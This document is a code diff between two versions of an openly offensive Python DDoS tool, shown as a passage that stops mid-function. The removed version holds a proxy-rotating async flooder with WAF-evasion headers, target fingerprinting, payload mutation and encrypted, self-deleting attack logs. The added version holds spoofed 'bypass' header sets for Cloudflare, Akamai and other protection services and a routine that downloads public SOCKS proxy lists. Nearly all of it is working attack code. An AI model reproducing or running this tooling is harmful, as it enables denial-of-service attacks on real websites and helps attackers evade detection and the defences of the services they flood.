@@ -1,925 +1,1467 @@
 #!/usr/bin/python -tt
-#===============================================
-# ULTRA PRO V6 NIGHTMARE - GOVERNMENT LEVEL
-# Advanced DDoS Framework with AI/ML
-# Async Optimization + Smart Proxy Rotation
-# Auto WAF Evasion + ML Fingerprinting
-#===============================================
-
-import asyncio
-import aiohttp
-import random
+#Coded by DQV
+#########################################
+#         Just a little change          #
+#           Đặng Quốc Vinh              #
+#    ULTRA PRO V2 - REAL PROXY + BYPASS#
+#########################################
+import requests
 import socket
-import ssl
+import socks
 import time
-import json
-import hashlib
-import base64
-import secrets
+import random
 import threading
-import logging
-import os
 import sys
-import struct
-import platform
-from datetime import datetime, timedelta
-from collections import defaultdict, deque
-from typing import List, Dict, Tuple, Optional
-from concurrent.futures import ThreadPoolExecutor
-from dataclasses import dataclass, field
+import ssl
+import datetime
+import os
 import urllib.parse
 from colorama import Fore, Back, Style, init
 
 init(autoreset=True)
 
-# ==================== LOGGING SYSTEM ====================
-class SecureLogger:
-    """Encrypted logging to prevent detection"""
-    def __init__(self, filename="attack.log", encrypted=False):
-        self.filename = filename
-        self.encrypted = encrypted
-        self.buffer = deque(maxlen=1000)
-        
-    def log(self, level, message):
-        timestamp = datetime.now().isoformat()
-        entry = f"[{timestamp}] {level}: {message}"
-        self.buffer.append(entry)
-        
-        if self.encrypted:
-            # XOR encryption (basic but effective)
-            key = hashlib.sha256(b"ultra_secret_key").digest()
-            encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(entry.encode())])
-            with open(self.filename, 'ab') as f:
-                f.write(encrypted + b'\n')
-        else:
-            with open(self.filename, 'a') as f:
-                f.write(entry + '\n')
-    
-    def clear_logs(self):
-        """Auto-delete logs after 1 hour"""
-        try:
-            if os.path.exists(self.filename):
-                if time.time() - os.path.getmtime(self.filename) > 3600:
-                    os.remove(self.filename)
-        except:
-            pass
+print (f'''{Fore.RED}
+                __                      _____
+               / /  __ _ _   _  ___ _ _|___  |
+              / /  / _` | | | |/ _ \ '__| / /
+             / /__| (_| | |_| |  __/ |   / /
+             \____/\__,_|\__, |\___|_|  /_/
+                          |___/
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+~~~ TOOL DQV-DDoS ULTRA PRO V2 - REAL PROXY + BYPASS
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+~~~ Advanced DDoS Framework - Vượt qua mọi WAF/DDoS Protection
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{Style.RESET_ALL}''')
 
-logger = SecureLogger("attack.log", encrypted=True)
+acceptall = [
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
+	"Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: vi-VN,vi;q=0.9,en;q=0.8\r\n",
+	"Accept: application/json, text/plain, */*\r\nAccept-Language: en-US,en;q=0.9\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: ja-JP,ja;q=0.9,en;q=0.8\r\n",
+	"Accept: image/webp,image/apng,image/*,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\n",
+	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\n",
+	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\n",
+]
 
-# ==================== 1️⃣ ULTRA ASYNC OPTIMIZER ====================
-class UltraAsyncOptimizer:
-    """Non-blocking, efficient async request handling"""
-    
-    def __init__(self, max_connections=500, timeout=5):
-        self.max_connections = max_connections
-        self.timeout = timeout
-        self.semaphore = asyncio.Semaphore(max_connections)
-        self.connector = None
-        self.session = None
-        
-    async def init_session(self):
-        """Initialize optimized connector"""
-        tcp_connector = aiohttp.TCPConnector(
-            limit=self.max_connections,
-            limit_per_host=30,
-            ttl_dns_cache=300,
-            enable_cleanup_closed=True,
-            force_close=False,
-            keepalive_timeout=30
-        )
-        
-        timeout = aiohttp.ClientTimeout(total=self.timeout, connect=2)
-        self.session = aiohttp.ClientSession(
-            connector=tcp_connector,
-            timeout=timeout,
-            headers={'User-Agent': self._random_ua()}
-        )
-        
-    async def close_session(self):
-        """Graceful shutdown"""
-        if self.session:
-            await self.session.close()
-            await asyncio.sleep(0.25)  # Allow time for cleanup
-    
-    async def async_request(self, method, url, headers=None, data=None, proxy=None):
-        """Non-blocking request with proper async handling"""
-        async with self.semaphore:
-            try:
-                async with self.session.request(
-                    method, url,
-                    headers=headers,
-                    data=data,
-                    proxy=proxy,
-                    ssl=False,
-                    allow_redirects=False,
-                    timeout=aiohttp.ClientTimeout(total=self.timeout)
-                ) as resp:
-                    status = resp.status
-                    headers_resp = dict(resp.headers)
-                    body = await resp.text(errors='ignore')
-                    return {
-                        'status': status,
-                        'headers': headers_resp,
-                        'body': body[:500],  # Limited body
-                        'success': True,
-                        'timestamp': time.time()
-                    }
-            except asyncio.TimeoutError:
-                return {'success': False, 'error': 'timeout', 'timestamp': time.time()}
-            except aiohttp.ClientError as e:
-                return {'success': False, 'error': str(e), 'timestamp': time.time()}
-            except Exception as e:
-                return {'success': False, 'error': str(type(e).__name__), 'timestamp': time.time()}
-    
-    @staticmethod
-    def _random_ua():
-        uas = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-        ]
-        return random.choice(uas)
+referers = [
+	"https://www.google.com/search?q=",
+	"https://www.google.com/",
+	"https://www.facebook.com/",
+	"https://www.youtube.com/",
+	"https://www.bing.com/search?q=",
+	"https://www.reddit.com/",
+	"https://www.instagram.com/",
+	"https://www.linkedin.com/",
+	"https://www.twitter.com/",
+	"https://www.pinterest.com/",
+	"https://www.quora.com/",
+	"https://www.github.com/",
+	"https://www.stackoverflow.com/",
+	"https://www.wikipedia.org/",
+	"https://www.amazon.com/",
+]
 
-# ==================== 2️⃣ QUANTUM PROXY MANAGER ====================
-@dataclass
-class ProxyMetrics:
-    """Track proxy health metrics"""
-    proxy: str
-    success_count: int = 0
-    failed_count: int = 0
-    timeout_count: int = 0
-    response_times: deque = field(default_factory=lambda: deque(maxlen=100))
-    last_used: float = field(default_factory=time.time)
-    blocked_count: int = 0
-    rate_limited_count: int = 0
-    consecutive_failures: int = 0
-    
-    @property
-    def health_score(self) -> float:
-        """Calculate proxy health 0-100"""
-        if self.success_count == 0:
-            return 0.0
-        
-        total = self.success_count + self.failed_count + self.timeout_count
-        success_rate = (self.success_count / total) * 100
-        
-        # Avg response time (lower is better)
-        avg_response = sum(self.response_times) / len(self.response_times) if self.response_times else 0
-        response_score = max(0, 100 - (avg_response * 10))
-        
-        # Consecutive failures penalty
-        failure_penalty = min(50, self.consecutive_failures * 5)
-        
-        return max(0, (success_rate * 0.6 + response_score * 0.3) - failure_penalty)
-    
-    @property
-    def is_dead(self) -> bool:
-        """Proxy is dead if: 10+ consecutive failures"""
-        return self.consecutive_failures >= 10
-    
-    @property
-    def is_rate_limited(self) -> bool:
-        """Proxy is rate limited if: 5+ 429 responses"""
-        return self.rate_limited_count >= 5
+ind_dict = {}
+data = ""
+cookies = ""
+strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 
-class QuantumProxyManager:
-    """Advanced proxy selection with health tracking"""
-    
-    def __init__(self):
-        self.proxies: Dict[str, ProxyMetrics] = {}
-        self.strategy = "quantum"  # quantum, weighted, round-robin, health, geo
-        self.current_index = 0
-        self.lock = threading.RLock()
-        
-    def add_proxies(self, proxy_list: List[str]):
-        """Add proxies to pool"""
-        with self.lock:
-            for proxy in proxy_list:
-                if proxy not in self.proxies:
-                    self.proxies[proxy] = ProxyMetrics(proxy=proxy)
-    
-    def select_proxy(self) -> Optional[str]:
-        """Select best proxy based on strategy"""
-        with self.lock:
-            alive_proxies = {p: m for p, m in self.proxies.items() if not m.is_dead}
-            
-            if not alive_proxies:
-                return None
-            
-            if self.strategy == "quantum":
-                # Multi-criteria: health + freshness + response time
-                scores = {}
-                for proxy, metrics in alive_proxies.items():
-                    health = metrics.health_score
-                    freshness = 1 / (1 + (time.time() - metrics.last_used) / 60)
-                    scores[proxy] = health * 0.7 + freshness * 30
-                return max(scores, key=scores.get)
-            
-            elif self.strategy == "weighted":
-                # Weighted random based on health
-                total_health = sum(m.health_score for m in alive_proxies.values())
-                if total_health == 0:
-                    return random.choice(list(alive_proxies.keys()))
-                
-                rand = random.uniform(0, total_health)
-                current = 0
-                for proxy, metrics in alive_proxies.items():
-                    current += metrics.health_score
-                    if rand <= current:
-                        return proxy
-            
-            elif self.strategy == "round-robin":
-                proxies = list(alive_proxies.keys())
-                proxy = proxies[self.current_index % len(proxies)]
-                self.current_index += 1
-                return proxy
-            
-            elif self.strategy == "health":
-                return max(alive_proxies, key=lambda p: alive_proxies[p].health_score)
-            
-            else:  # random
-                return random.choice(list(alive_proxies.keys()))
-    
-    def update_proxy_metrics(self, proxy: str, response: Dict):
-        """Update proxy metrics based on response"""
-        with self.lock:
-            if proxy not in self.proxies:
-                return
-            
-            metrics = self.proxies[proxy]
-            metrics.last_used = time.time()
-            
-            if not response.get('success'):
-                metrics.failed_count += 1
-                metrics.timeout_count += (1 if response.get('error') == 'timeout' else 0)
-                metrics.consecutive_failures += 1
-            else:
-                metrics.success_count += 1
-                metrics.consecutive_failures = 0
-                
-                status = response.get('status', 0)
-                if status == 429:
-                    metrics.rate_limited_count += 1
-                elif status in [403, 405]:
-                    metrics.blocked_count += 1
-                
-                # Track response time
-                if 'timestamp' in response:
-                    metrics.response_times.append(time.time() - response['timestamp'])
-    
-    def get_proxy_stats(self) -> Dict:
-        """Get stats for display"""
-        with self.lock:
-            return {
-                proxy: {
-                    'health': metrics.health_score,
-                    'success': metrics.success_count,
-                    'failed': metrics.failed_count,
-                    'avg_response': sum(metrics.response_times) / len(metrics.response_times) if metrics.response_times else 0,
-                    'is_dead': metrics.is_dead,
-                    'is_rate_limited': metrics.is_rate_limited
-                }
-                for proxy, metrics in self.proxies.items()
-            }
+Intn = random.randint
+Choice = random.choice
 
-# ==================== 3️⃣ ADAPTIVE WAF EVASION ENGINE ====================
-class AdaptiveWAFEngine:
-    """Self-learning WAF bypass"""
-    
-    def __init__(self):
-        self.waf_type = None
-        self.detection_history = deque(maxlen=100)
-        self.evasion_history = defaultdict(int)  # track what worked
-        self.current_level = 1  # 1-5 (5 = maximum evasion)
-        self.rate_limit_window = 60
-        self.last_rate_limit = 0
-        self.lock = threading.RLock()
-        
-        self.waf_signatures = {
-            'cloudflare': ['cf-ray', 'cf-request-id', 'cf-connecting-ip'],
-            'akamai': ['akamai-origin-hop', 'true-client-ip'],
-            'modsecurity': ['mod-security', 'mod_security'],
-            'imperva': ['visid_incap', '_incap_ses'],
-            'f5': ['TS01', 'JSESSIONID'],
-        }
-    
-    def detect_waf(self, response: Dict) -> Optional[str]:
-        """Detect WAF from response headers"""
-        headers = response.get('headers', {}).lower()
-        body = response.get('body', '').lower()
-        
-        for waf, signatures in self.waf_signatures.items():
-            if any(sig in headers or sig in body for sig in signatures):
-                return waf
-        
-        status = response.get('status')
-        if status == 403:
-            if 'cloudflare' in body:
-                return 'cloudflare'
-            elif 'akamai' in body:
-                return 'akamai'
-            else:
-                return 'unknown_waf'
-        
-        return None
-    
-    def analyze_response(self, response: Dict) -> Dict:
-        """Analyze response and recommend action"""
-        with self.lock:
-            status = response.get('status', 0)
-            
-            result = {
-                'action': 'continue',
-                'next_level': self.current_level,
-                'adjust_delay': 0,
-                'change_proxy': False,
-                'change_path': False
-            }
-            
-            # Detect WAF
-            waf = self.detect_waf(response)
-            if waf and waf != self.waf_type:
-                self.waf_type = waf
-                logger.log("INFO", f"WAF detected: {waf}")
-            
-            # Rate limit
-            if status == 429:
-                result['action'] = 'backoff'
-                result['adjust_delay'] = min(10, 0.5 * (time.time() - self.last_rate_limit))
-                result['change_proxy'] = True
-                result['next_level'] = min(5, self.current_level + 1)
-                self.last_rate_limit = time.time()
-            
-            # WAF blocked
-            elif status in [403, 405]:
-                result['action'] = 'evasion'
-                result['change_proxy'] = True
-                result['change_path'] = True
-                result['next_level'] = min(5, self.current_level + 1)
-            
-            # Captcha/Challenge
-            elif status in [202, 204] or 'captcha' in response.get('body', '').lower():
-                result['action'] = 'wait_and_retry'
-                result['adjust_delay'] = 5
-                result['change_proxy'] = True
-            
-            # Server error (good for attack)
-            elif status in [500, 502, 503]:
-                result['action'] = 'continue'
-                self.evasion_history[f"level_{self.current_level}"] += 1
-            
-            return result
-    
-    def get_evasion_headers(self) -> Dict[str, str]:
-        """Generate evasion headers based on current level"""
-        headers = {
-            'User-Agent': self._random_ua(),
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'max-age=0',
-        }
-        
-        if self.current_level >= 1:
-            headers['X-Forwarded-For'] = self._random_ip()
-            headers['X-Forwarded-Proto'] = 'https'
-        
-        if self.current_level >= 2:
-            headers['CF-Connecting-IP'] = self._random_ip()
-            headers['X-Real-IP'] = self._random_ip()
-            headers['X-Client-IP'] = self._random_ip()
-        
-        if self.current_level >= 3:
-            headers['X-Original-URL'] = '/'
-            headers['X-Rewrite-URL'] = '/'
-            headers['X-Original-Method'] = 'GET'
-        
-        if self.current_level >= 4:
-            headers['Accept-Encoding'] = 'gzip, deflate, br'
-            headers['Accept-Language'] = f"{random.choice(['en-US', 'en', 'fr', 'de'])},en;q=0.9"
-            headers['Sec-Fetch-Dest'] = 'document'
-            headers['Sec-Fetch-Mode'] = 'navigate'
-            headers['Sec-Fetch-Site'] = 'none'
-        
-        if self.current_level >= 5:
-            headers['X-HTTP-Method-Override'] = random.choice(['GET', 'POST', 'PUT'])
-            headers['X-Method-Override'] = 'GET'
-            headers[f'X-Junk-{secrets.token_hex(4)}'] = secrets.token_hex(16)
-        
-        return headers
-    
-    @staticmethod
-    def _random_ip() -> str:
-        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    
-    @staticmethod
-    def _random_ua() -> str:
-        uas = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15",
-        ]
-        return random.choice(uas)
+# ========== ULTRA BYPASS HEADERS DATABASE ==========
+ULTRA_BYPASS_HEADERS = {
+	"cloudflare_super": [
+		("CF-Connecting-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Originating-IP", lambda: f"[{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}]"),
+		("X-Forwarded-Proto", "https"),
+		("X-Forwarded-Host", lambda: "example.com"),
+		("X-ProxyUser-Ip", "1.1.1.1"),
+		("X-Original-URL", "/"),
+		("CF-RAY", lambda: ''.join(random.choices('0123456789abcdef', k=16))),
+		("CF-Request-ID", lambda: ''.join(random.choices('0123456789', k=16))),
+	],
+	"akamai_ultra": [
+		("X-Akamai-Edgescape", "cookie_accepted=yes"),
+		("X-Akamai-Session-Info", lambda: f"id={Intn(100000,999999)}"),
+		("X-Akamai-Request-BC", lambda: ''.join(random.choices('0123456789', k=20))),
+		("X-Akamai-ConfigId", "15"),
+		("Akamai-Purge-Action", "cache-tag-all"),
+		("X-Akamai-Authorization", "ECD"),
+	],
+	"ddosguard_bypass": [
+		("X-DDoS-Guard", "bypass"),
+		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("CF-Connecting-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Real-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Client-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+	],
+	"arvancloud_bypass": [
+		("X-Arvan", "bypass"),
+		("X-Arvan-IP", "1.1.1.1"),
+		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+	],
+	"incapsula_bypass": [
+		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Real-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Client-IP", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Originating-IP", lambda: f"[{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}]"),
+	],
+	"waf_bypass": [
+		("X-Forwarded-For", lambda: f"{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}.{Intn(1,255)}"),
+		("X-Forwarded-Proto", "https"),
+		("X-Forwarded-Host", lambda: "localhost"),
+		("X-Original-URL", "/"),
+		("X-Rewrite-URL", "/"),
+		("X-Http-Method-Override", "GET"),
+		("X-Method-Override", "GET"),
+	],
+	"apache_bypass": [
+		("Connection", "TE"),
+		("TE", "trailers"),
+		("X-Http-Method-Override", "GET"),
+		("X-Original-Method", "GET"),
+	],
+	"nginx_bypass": [
+		("X-Original-URL", "/"),
+		("X-Rewrite-URL", "/"),
+		("X-Forwarded-Ssl", "on"),
+		("X-Forwarded-Proto", "https"),
+	],
+}
 
-# ==================== 4️⃣ ML FINGERPRINT ANALYZER ====================
-class MLFingerprintAnalyzer:
-    """Machine learning target fingerprinting"""
-    
-    def __init__(self):
-        self.server_type = None
-        self.waf_type = None
-        self.framework = None
-        self.heavy_endpoints = []
-        self.cache_policy = None
-        self.cdn_type = None
-        self.response_patterns = defaultdict(int)
-        
-    async def analyze_target(self, target: str, port: int) -> Dict:
-        """Deep fingerprint analysis of target"""
-        fingerprint = {
-            'target': target,
-            'port': port,
-            'server': None,
-            'framework': None,
-            'waf': None,
-            'cdn': None,
-            'cache': None,
-            'heavy_endpoints': [],
-            'confidence': 0
-        }
-        
-        # Multiple probe vectors
-        probes = [
-            ('/', 'GET'),
-            ('/index.html', 'GET'),
-            ('/admin', 'GET'),
-            ('/api', 'GET'),
-            ('/api/v1', 'GET'),
-            ('/login', 'GET'),
-            ('/search', 'POST'),
-            ('/.env', 'GET'),
-            ('/wp-content', 'GET'),
-            ('/xmlrpc.php', 'POST'),
-        ]
-        
-        responses = {}
-        for path, method in probes:
-            try:
-                # Simulate probe
-                response = await self._make_probe(target, port, path, method)
-                responses[path] = response
-                
-                # Analyze each response
-                self._analyze_response(fingerprint, path, response)
-            except:
-                pass
-        
-        fingerprint['confidence'] = len([r for r in responses.values() if r]) / len(probes) * 100
-        return fingerprint
-    
-    async def _make_probe(self, target: str, port: int, path: str, method: str) -> Dict:
-        """Make probe request"""
-        try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=3)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{'https' if port == 443 else 'http'}://{target}:{port}{path}"
-                async with session.request(method, url) as resp:
-                    return {
-                        'status': resp.status,
-                        'headers': dict(resp.headers),
-                        'body': await resp.text(errors='ignore')
-                    }
-        except:
-            return None
-    
-    def _analyze_response(self, fingerprint: Dict, path: str, response: Dict):
-        """Analyze single response for indicators"""
-        if not response:
-            return
-        
-        headers = response.get('headers', {})
-        body = response.get('body', '')
-        status = response.get('status', 0)
-        
-        # Server detection
-        server = headers.get('server', '').lower()
-        if 'nginx' in server:
-            fingerprint['server'] = 'nginx'
-        elif 'apache' in server:
-            fingerprint['server'] = 'apache'
-        elif 'cloudflare' in server or headers.get('cf-ray'):
-            fingerprint['cdn'] = 'cloudflare'
-        
-        # Framework detection
-        if 'x-powered-by' in headers:
-            fingerprint['framework'] = headers['x-powered-by']
-        
-        # WAF detection
-        if status == 403 and 'cloudflare' in body.lower():
-            fingerprint['waf'] = 'cloudflare'
-        elif headers.get('x-frame-options'):
-            fingerprint['waf'] = 'modsecurity'
-        
-        # Heavy endpoint detection
-        if status in [200, 404] and len(body) > 50000:
-            fingerprint['heavy_endpoints'].append(path)
-        
-        # Cache policy
-        cache_control = headers.get('cache-control', '')
-        if 'max-age=0' in cache_control:
-            fingerprint['cache'] = 'no-cache'
-        elif 'no-cache' in cache_control:
-            fingerprint['cache'] = 'no-cache'
-    
-    def recommend_payload_type(self) -> str:
-        """Recommend attack type based on fingerprint"""
-        if self.framework and 'wordpress' in self.framework.lower():
-            return 'xmlrpc_attack'
-        elif self.cdn_type == 'cloudflare':
-            return 'cf_bypass_attack'
-        elif self.server_type == 'nginx':
-            return 'slow_read_attack'
-        else:
-            return 'hybrid_attack'
+class UltraStats:
+	def __init__(self):
+		self.start_time = time.time()
+		self.requests_sent = 0
+		self.bytes_sent = 0
+		self.errors = 0
+		self.lock = threading.Lock()
+		self.peak_rps = 0
+		self.success_count = 0
+	
+	def add_request(self, bytes_sent=0):
+		with self.lock:
+			self.requests_sent += 1
+			self.bytes_sent += bytes_sent
+			self.success_count += 1
+	
+	def add_error(self):
+		with self.lock:
+			self.errors += 1
+	
+	def get_stats(self):
+		elapsed = max(time.time() - self.start_time, 0.1)
+		rps = self.requests_sent / elapsed
+		self.peak_rps = max(self.peak_rps, rps)
+		mbps = (self.bytes_sent / elapsed) / (1024 * 1024)
+		success_rate = (self.success_count / max(self.requests_sent, 1)) * 100
+		return {
+			'requests': self.requests_sent,
+			'bytes': self.bytes_sent,
+			'errors': self.errors,
+			'elapsed': elapsed,
+			'rps': rps,
+			'mbps': mbps,
+			'peak_rps': self.peak_rps,
+			'success_rate': success_rate,
+		}
 
-# ==================== 5️⃣ ADVANCED PAYLOAD MUTATION ====================
-class AdvancedPayloadMutator:
-    """Generate complex, hard-to-detect payloads"""
-    
-    def __init__(self):
-        self.mutation_count = 0
-        
-    def mutate_request(self, method: str, path: str, data: str = None, level: int = 1) -> Tuple[str, str, str]:
-        """Generate mutated request"""
-        
-        # Level 1: Basic variation
-        if level >= 1:
-            path = self._add_cache_bypass(path)
-            path = self._random_case(path)
-        
-        # Level 2: Parameter mutation
-        if level >= 2:
-            if method == 'GET':
-                path = self._add_junk_params(path)
-            if data:
-                data = self._mutate_post_data(data)
-        
-        # Level 3: Encoding
-        if level >= 3:
-            path = self._apply_encoding(path)
-        
-        # Level 4: Advanced techniques
-        if level >= 4:
-            method = self._mutate_method(method)
-            path = self._inject_null_bytes(path)
-        
-        # Level 5: Chaos
-        if level >= 5:
-            path = self._unicode_encoding(path)
-            data = self._compression_bomb(data) if data else None
-        
-        self.mutation_count += 1
-        return method, path, data
-    
-    @staticmethod
-    def _add_cache_bypass(path: str) -> str:
-        """Add cache bypass parameters"""
-        params = [
-            f"_={int(time.time()*1000)}",
-            f"cb={secrets.token_hex(8)}",
-            f"v={random.randint(1, 999999)}",
-            f"t={secrets.token_hex(4)}",
-        ]
-        separator = '&' if '?' in path else '?'
-        return path + separator + random.choice(params)
-    
-    @staticmethod
-    def _random_case(path: str) -> str:
-        """Randomize case for bypass"""
-        parts = path.split('/')
-        return '/'.join([part if i == 0 else ''.join(
-            c.upper() if random.random() > 0.5 else c for c in part
-        ) for i, part in enumerate(parts)])
-    
-    @staticmethod
-    def _add_junk_params(path: str) -> str:
-        """Add junk parameters"""
-        junk = {
-            f"x{random.randint(1,999)}": secrets.token_hex(random.randint(2, 10)),
-            f"j{random.randint(1,999)}": ''.join(random.choices('abcdef01', k=16)),
-        }
-        separator = '&' if '?' in path else '?'
-        return path + separator + '&'.join(f"{k}={v}" for k, v in junk.items())
-    
-    @staticmethod
-    def _mutate_post_data(data: str) -> str:
-        """Mutate POST data"""
-        # Add junk fields
-        mutations = [
-            data + f"&junk={secrets.token_hex(16)}",
-            data + f"&x={random.randint(1,999999)}",
-            data.replace(' ', '\t'),  # Replace spaces with tabs
-        ]
-        return random.choice(mutations)
-    
-    @staticmethod
-    def _apply_encoding(path: str) -> str:
-        """Apply various encoding"""
-        encodings = [
-            lambda p: urllib.parse.quote(p),
-            lambda p: '%2e' + p.lstrip('/'),  # Dot encoding
-            lambda p: p.replace('/', '%2f'),  # Slash encoding
-        ]
-        return random.choice(encodings)(path)
-    
-    @staticmethod
-    def _mutate_method(method: str) -> str:
-        """Mutate HTTP method"""
-        alternatives = {
-            'GET': ['HEAD', 'OPTIONS', 'TRACE'],
-            'POST': ['PUT', 'PATCH'],
-        }
-        return random.choice(alternatives.get(method, [method]))
-    
-    @staticmethod
-    def _inject_null_bytes(path: str) -> str:
-        """Inject null bytes"""
-        if random.random() > 0.7:
-            return path + '%00.html'
-        return path
-    
-    @staticmethod
-    def _unicode_encoding(path: str) -> str:
-        """Unicode encoding for bypass"""
-        # Convert to unicode escapes
-        return ''.join(f'%u{ord(c):04x}' if c.isalpha() else c for c in path)
-    
-    @staticmethod
-    def _compression_bomb(data: str) -> str:
-        """Generate compression bomb payload"""
-        # Highly compressible payload
-        bomb = "A" * 100000  # 100KB of A's (compresses to few KB)
-        return f"data={bomb}"
+stats = UltraStats()
 
-# ==================== 6️⃣ INTELLIGENT PATH DISTRIBUTOR ====================
-class IntelligentPathDistributor:
-    """Smart path selection based on target analysis"""
-    
-    def __init__(self):
-        self.endpoint_weights = {}
-        self.crawled_paths = set()
-        self.heavy_endpoints = []
-        
-    async def discover_endpoints(self, target: str, port: int) -> List[str]:
-        """Discover endpoints that consume most resources"""
-        common_paths = [
-            '/', '/index.html', '/api', '/api/v1', '/api/v2',
-            '/admin', '/admin-panel', '/admin/login',
-            '/user', '/users', '/account', '/profile',
-            '/search', '/search?q=test',
-            '/upload', '/download', '/media',
-            '/login', '/register', '/auth',
-            '/database', '/backup', '/config',
-            '/wp-admin', '/wp-content', '/wp-json',
-            '/xmlrpc.php', '/api.php',
-            '/graphql', '/graphql/query',
-            '/rest/api', '/v1/api',
-            '/static', '/assets', '/public',
-            '/debug', '/status', '/health',
-            '/logs', '/error', '/500',
-        ]
-        
-        heavy_endpoints = []
-        for path in common_paths[:10]:  # Test subset
-            try:
-                connector = aiohttp.TCPConnector(ssl=False)
-                timeout = aiohttp.ClientTimeout(total=2)
-                
-                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                    url = f"{'https' if port == 443 else 'http'}://{target}:{port}{path}"
-                    async with session.get(url) as resp:
-                        body_size = len(await resp.text(errors='ignore'))
-                        # Endpoints with large responses likely consume more resources
-                        if body_size > 10000:
-                            heavy_endpoints.append(path)
-                            self.endpoint_weights[path] = body_size
-            except:
-                pass
-        
-        self.heavy_endpoints = heavy_endpoints or ['/']
-        return self.heavy_endpoints
-    
-    def select_path(self) -> str:
-        """Select path - prefer heavy endpoints"""
-        if not self.heavy_endpoints:
-            return '/'
-        
-        # 70% heavy endpoints, 30% random
-        if random.random() < 0.7:
-            return random.choice(self.heavy_endpoints)
-        else:
-            return random.choice(['/', '/api', '/search', '/admin'])
+def download_real_proxies():
+	"""Download REAL working proxies from multiple sources"""
+	print(f"\n{Fore.CYAN}[*] Downloading REAL proxies from multiple sources...{Fore.RESET}\n")
+	
+	proxies_list = []
+	
+	sources_socks5 = [
+		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+		"https://spys.me/socks.txt",
+		"https://www.proxy-list.download/api/v1/get?type=socks5",
+		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+		"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
+	]
+	
+	sources_socks4 = [
+		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+		"https://www.proxy-list.download/api/v1/get?type=socks4",
+		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&simplified=true",
+	]
+	
+	all_sources = sources_socks5 + sources_socks4
+	
+	for idx, source in enumerate(all_sources, 1):
+		try:
+			print(f"{Fore.CYAN}[{idx}/{len(all_sources)}] Downloading from: {source}{Fore.RESET}")
+			response = requests.get(source, timeout=5)
+			
+			if response.status_code == 200:
+				for line in response.text.split('\n'):
+					line = line.strip()
+					if line and ':' in line:
+						proxies_list.append(line)
